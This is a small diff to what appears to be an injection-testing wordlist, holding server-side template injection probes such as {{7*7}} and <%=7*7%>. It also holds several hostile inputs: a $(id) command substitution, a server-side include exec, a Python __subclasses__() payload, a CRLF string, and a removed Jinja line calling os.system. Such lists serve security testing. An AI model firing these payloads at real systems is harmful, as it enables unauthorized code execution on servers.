@@ -4,5 +4,13 @@
 $(id)
 ${7*7}
 {{7*7}}
-{%import os%}{{os.system('id')}}
 <!--#exec cmd='id'-->
+<%=7*7%>
+#{7*7}
+[[${7*7}]]
+*{7*7}
+{{''.__class__.__mro__[2].__subclasses__()}}
+<xsl:value-of select="system-property('xsl:version')"/>
+%0a%0d
+
+
